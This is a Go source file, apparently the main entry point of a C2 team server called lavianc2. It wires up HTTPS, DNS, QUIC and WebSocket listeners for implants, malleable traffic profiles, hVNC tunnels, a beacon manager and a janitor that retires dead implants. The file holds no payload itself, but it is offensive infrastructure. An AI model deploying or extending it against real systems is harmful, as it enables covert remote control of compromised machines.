package main

import (
	"context"
	"log/slog"
	"net"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/google/uuid"
	"github.com/uLl0a/lavianc2/internal/api"
	"github.com/uLl0a/lavianc2/internal/beacons"
	"github.com/uLl0a/lavianc2/internal/config"
	"github.com/uLl0a/lavianc2/internal/crypto"
	"github.com/uLl0a/lavianc2/internal/events"
	"github.com/uLl0a/lavianc2/internal/listeners"
	"github.com/uLl0a/lavianc2/internal/models"
	"github.com/uLl0a/lavianc2/internal/protocol"
	"github.com/uLl0a/lavianc2/internal/profiles"
	
	"github.com/uLl0a/lavianc2/internal/sessions"
	"github.com/uLl0a/lavianc2/internal/storage"
	"github.com/uLl0a/lavianc2/internal/tasks"
)

func main() {
	cfg := config.Load()

	logLevel := slog.LevelInfo
	switch cfg.LogLevel {
	case "debug":
		logLevel = slog.LevelDebug
	case "warn":
		logLevel = slog.LevelWarn
	case "error":
		logLevel = slog.LevelError
	}
	log := slog.New(slog.NewJSONHandler(os.Stdout, &slog.HandlerOptions{Level: logLevel}))

	ctx, cancel := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer cancel()

	store, err := storage.NewStore(ctx, cfg.DBDSN)
	if err != nil {
		log.Error("no se pudo conectar a PostgreSQL", "err", err)
		os.Exit(1)
	}
	defer store.Close()
	log.Info("conectado a PostgreSQL")

	serverKeys, err := crypto.LoadServerKeyStore("certs")
	if err != nil {
		log.Error("no se pudo cargar server key store", "err", err)
		os.Exit(1)
	}
	log.Info("server key store cargado",
		"pubkey_prefix", serverKeys.PublicKeyBase64()[:16]+"...",
		"priv_path", serverKeys.PrivateKeyPath(),
	)

	bus := events.NewBus(8, 2048)
	bus.Start(ctx)
	log.Info("event bus arrancado", "workers", 8, "queue", 2048)

	registry := sessions.NewRegistry()
	engine := tasks.NewEngine(store, registry, bus, log)
	log.Info("motor de tareas inicializado")

	profilesRegistry := profiles.NewRegistry()
	log.Info("perfiles maleables cargados", "perfiles", profilesRegistry.List())

	dnsProfilesRegistry := profiles.NewDNSRegistry()
	log.Info("perfiles DNS cargados", "perfiles", dnsProfilesRegistry.List())

	quicProfilesRegistry := profiles.NewQUICRegistry()
	log.Info("perfiles QUIC cargados", "perfiles", quicProfilesRegistry.List())

	httpsID, err := ensureDefaultListener(
		ctx, store,
		"default-https",
		models.ListenerHTTPS,
		cfg.HTTPSAddr,
		"",
		log,
	)
	if err != nil {
		log.Error("no se pudo asegurar listener HTTPS en DB", "err", err)
		os.Exit(1)
	}

	httpsListener, err := listeners.NewHTTPSListener(
		httpsID,
		"default-https",
		cfg.HTTPSAddr,
		"",
		store,
		registry,
		bus,
		serverKeys,
		cfg.TLSCertFile,
		cfg.TLSKeyFile,
		cfg.RekeyEvery,
		log,
	)
	if err != nil {
		log.Error("no se pudo crear listener HTTPS", "err", err)
		os.Exit(1)
	}
	go func() {
		if err := httpsListener.Start(); err != nil {
			log.Error("listener HTTPS detenido", "err", err)
		}
	}()
	log.Info("listener HTTPS activo", "addr", cfg.HTTPSAddr, "id", httpsID, "tls", true)

	// ---- DNS listener ----
	dnsID, err := ensureDefaultListener(
		ctx, store,
		"default-dns",
		models.ListenerDNS,
		cfg.DNSAddr,
		cfg.DNSDomain,
		log,
	)
	if err != nil {
		log.Error("no se pudo asegurar listener DNS en DB", "err", err)
		os.Exit(1)
	}

	dnsListener, err := listeners.NewDNSListener(
		dnsID,
		"default-dns",
		cfg.DNSAddr,
		cfg.DNSDomain,
		store,
		registry,
		bus,
		serverKeys,
		cfg.RekeyEvery,
		log,
	)
	if err != nil {
		log.Error("no se pudo crear listener DNS", "err", err)
		os.Exit(1)
	}
	dnsCtx, dnsCancel := context.WithCancel(ctx)
	go func() {
		if err := dnsListener.Start(dnsCtx); err != nil {
			log.Error("DNS listener detenido", "err", err)
		}
	}()
	log.Info("listener DNS activo", "addr", cfg.DNSAddr, "domain", cfg.DNSDomain, "id", dnsID)

	// ---- QUIC listener ----
	quicID, err := ensureDefaultListener(
		ctx, store,
		"default-quic",
		models.ListenerQUIC,
		cfg.QUICAddr,
		"",
		log,
	)
	if err != nil {
		log.Error("no se pudo asegurar listener QUIC en DB", "err", err)
		os.Exit(1)
	}

	quicListener, err := listeners.NewQUICListener(
		quicID,
		"default-quic",
		cfg.QUICAddr,
		store,
		registry,
		bus,
		serverKeys,
		quicProfilesRegistry,
		cfg.QUICProfile,
		cfg.TLSCertFile,
		cfg.TLSKeyFile,
		cfg.RekeyEvery,
		log,
	)
	if err != nil {
		log.Error("no se pudo crear listener QUIC", "err", err)
		os.Exit(1)
	}
	quicCtx, quicCancel := context.WithCancel(ctx)
	go func() {
		if err := quicListener.Start(quicCtx); err != nil {
			log.Error("QUIC listener detenido", "err", err)
		}
	}()
	log.Info("listener QUIC activo", "addr", cfg.QUICAddr, "id", quicID)

	// ---- Multi-Beacon Manager ----
	// store.Implants actúa como lookup para adoptar implants reales como
	// beacons gestionados (vinculación implant↔beacon).
	beaconManager := beacons.NewManager(ctx, store.Beacons, store.Implants, bus, log)
	beaconManager.Start(ctx)
	log.Info("multi-beacon manager activo")

	// ---- WS listener (túneles hVNC / streaming) ----
	// La migración 0003 amplía listeners_type_check para aceptar
	// 'websocket' de forma idempotente; sin ella este ensure falla con
	// violación de check constraint.
	wsID, err := ensureDefaultListener(
		ctx, store,
		"default-websocket",
		models.ListenerType("websocket"),
		cfg.WSAddr,
		"",
		log,
	)
	if err != nil {
		log.Error("no se pudo asegurar listener WS en DB", "err", err)
		os.Exit(1)
	}
	wsListener, err := listeners.NewWSListener(listeners.WSListenerConfig{
		ID:       wsID,
		Name:     "default-websocket",
		BindAddr: cfg.WSAddr,
		CertFile: cfg.TLSCertFile,
		KeyFile:  cfg.TLSKeyFile,
		Store:    store,
		Log:      log,
		Router:   protocol.NewRouter(log),
		Manager:  beaconManager,
	})
	if err != nil {
		log.Error("no se pudo crear listener WS", "err", err)
		os.Exit(1)
	}
	wsCtx, wsCancel := context.WithCancel(ctx)
	go func() {
		if err := wsListener.Start(wsCtx); err != nil {
			log.Error("WS listener detenido", "err", err)
		}
	}()
	log.Info("listener WS activo", "addr", cfg.WSAddr, "id", wsID)

	// El janitor necesita los listeners para purgar sus rekeys pendientes.
	go runStaleJanitor(ctx, store, bus, log, dnsListener, httpsListener, quicListener)

	// ---- gRPC admin API ----
	apiServer, err := api.NewServer(api.Config{
		Addr:     cfg.GRPCAddr,
		CertFile: cfg.TLSCertFile,
		KeyFile:  cfg.TLSKeyFile,
		CAFile:   cfg.CAFile,

		Store:        store,
		Engine:       engine,
		Bus:          bus,
		Profiles:     profilesRegistry,
		DNSProfiles:  dnsProfilesRegistry,
		QUICProfiles: quicProfilesRegistry,
		ServerKeys:   serverKeys,
		BeaconMgr:    beaconManager,
		RepoRoot:     ".",
	}, log)
	if err != nil {
		log.Error("no se pudo crear gRPC server", "err", err)
		os.Exit(1)
	}
	go func() {
		if err := apiServer.Start(); err != nil {
			log.Error("gRPC server detenido", "err", err)
		}
	}()
	log.Info("gRPC admin API activa", "addr", cfg.GRPCAddr, "mtls", true)

	log.Info("team server arrancado, esperando señales…")
	<-ctx.Done()

	log.Info("apagando team server…")

	shutdownCtx, shutdownCancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer shutdownCancel()

	dnsCancel()
	_ = dnsListener.Stop(shutdownCtx)
	log.Info("listener DNS detenido")

	_ = httpsListener.Stop(shutdownCtx)
	log.Info("listener HTTPS detenido")

	quicCancel()
	_ = quicListener.Stop(shutdownCtx)
	log.Info("listener QUIC detenido")

	wsCancel()
	_ = wsListener.Stop(shutdownCtx)
	log.Info("listener WS detenido")

	beaconManager.Stop()
	log.Info("multi-beacon manager detenido")

	apiServer.Stop()
	log.Info("gRPC admin API detenida")

	store.Close()
	log.Info("almacenamiento cerrado")

	log.Info("team server apagado limpiamente")
}

func ensureDefaultListener(
	ctx context.Context,
	store *storage.Store,
	name string,
	typ models.ListenerType,
	bindAddr, domain string,
	log *slog.Logger,
) (uuid.UUID, error) {
	existing, err := store.Listeners.GetByName(ctx, name)
	if err != nil {
		return uuid.Nil, err
	}
	if existing != nil {
		log.Info("listener ya existe en DB",
			"name", name,
			"id", existing.ID,
			"active", existing.Active,
		)
		return existing.ID, nil
	}

	host, port := parseBindAddr(bindAddr)

	l := &models.Listener{
		ID:        uuid.New(),
		Name:      name,
		Type:      typ,
		BindAddr:  host,
		Port:      port,
		Domain:    domain,
		Config:    map[string]any{},
		Active:    true,
		CreatedAt: time.Now().UTC(),
	}
	if err := store.Listeners.Create(ctx, l); err != nil {
		return uuid.Nil, err
	}
	log.Info("listener creado en DB",
		"name", name,
		"id", l.ID,
		"bind_addr", host,
		"port", port,
	)
	return l.ID, nil
}

func parseBindAddr(bindAddr string) (string, int) {
	host := "0.0.0.0"
	port := 0

	if h, p, err := net.SplitHostPort(bindAddr); err == nil {
		if h != "" {
			host = h
		}
		if n, err := strconv.Atoi(p); err == nil {
			port = n
		}
		return host, port
	}

	s := strings.TrimPrefix(bindAddr, ":")
	if n, err := strconv.Atoi(s); err == nil {
		port = n
	}
	return host, port
}

// rekeyExpirer agrupa los listeners que saben purgar sus rekeys pendientes.
type rekeyExpirer interface {
	ExpirePendingRekeys() []uuid.UUID
}

func runStaleJanitor(
	ctx context.Context,
	store *storage.Store,
	bus *events.Bus,
	log *slog.Logger,
	expirers ...rekeyExpirer,
) {
	t := time.NewTicker(time.Minute)
	defer t.Stop()

	// Una tarea 'sent' sin resultado tras este umbral es un zombi.
	const taskStaleAfter = 10 * time.Minute

	for {
		select {
		case <-ctx.Done():
			return
		case <-t.C:
			// Rekeys pendientes expirados en cada listener.
			for _, ex := range expirers {
				for _, id := range ex.ExpirePendingRekeys() {
					log.Warn("janitor: rekey pendiente expirado", "implant", id)
				}
			}

			ids, err := store.Implants.MarkStaleAsDead(ctx)
			if err != nil {
				log.Error("janitor: mark stale dead", "err", err)
				continue
			}
			for _, id := range ids {
				log.Info("implante marcado como dead", "id", id)

				// Limpiar las claves de sesión persistidas. La sesión
				// vuelve a crearse si el implante reconecta.
				if err := store.SessionKeys.Delete(ctx, id); err != nil {
					log.Warn("janitor: borrar session keys", "err", err, "implant", id)
				}

				// Notificar al bus para que los listeners limpien su
				// SessionCryptoStore in-memory.
				bus.Publish(ctx, events.Event{
					Topic:   events.TopicImplantDead,
					Payload: id,
				})
			}

			// Tareas zombis: 'sent' sin resultado tras el umbral.
			zombies, err := store.Tasks.MarkStaleSentAsFailed(ctx, taskStaleAfter)
			if err != nil {
				log.Error("janitor: mark stale sent tasks", "err", err)
			}
			for _, taskID := range zombies {
				log.Warn("tarea marcada como failed (zombi)",
					"task", taskID,
					"motivo", "despachada sin resultado",
					"umbral", taskStaleAfter.String(),
				)
				bus.Publish(ctx, events.Event{
					Topic: events.TopicTaskCompleted,
					Payload: map[string]any{
						"task_id": taskID,
						"status":  models.TaskFailed,
					},
				})
			}
		}
	}
}
